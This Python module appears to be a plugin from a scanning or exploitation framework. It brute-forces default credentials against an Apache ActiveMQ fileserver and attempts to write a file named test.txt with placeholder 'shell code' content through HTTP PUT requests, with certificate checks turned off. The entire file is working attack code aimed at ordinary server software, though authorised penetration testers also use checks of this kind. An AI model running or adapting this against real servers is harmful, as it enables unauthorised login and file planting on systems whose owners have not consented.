import base64
from typing import Optional

import requests

from lib.log import logger


def get_auth_header(username: str, password: str) -> str:
    credentials = f"{username}:{password}"
    return f"Basic {base64.b64encode(credentials.encode()).decode()}"


def run(url: str, port: int) -> Optional[str]:
    address = f"{url}:{port}"
    users = ["admin", "user", "root"]
    passwords = ["admin", "password", "123456", ""]

    for user in users:
        for pwd in passwords:
            headers = {'Authorization': get_auth_header(user, pwd)}
            data = "shell code"
            try:
                logger.info(f"Trying credentials: {user}:{pwd}")
                response = requests.put(
                    f"{address}/fileserver/test.txt",
                    headers=headers,
                    data=data,
                    timeout=9,
                    verify=False
                )
                if response.status_code == 204:
                    logger.success(f"ActiveMQ put file success with {user}:{pwd}")
                    return f"ActiveMQ put file success with {user}:{pwd}"
                logger.warning(f"Failed with {user}:{pwd}, status: {response.status_code}")
            except requests.RequestException as e:
                logger.error(f"Request failed for {user}:{pwd}: {str(e)}")
            except Exception as e:
                logger.error(f"Unexpected error for {user}:{pwd}: {str(e)}")

    logger.warning("No valid credentials found")
    return None
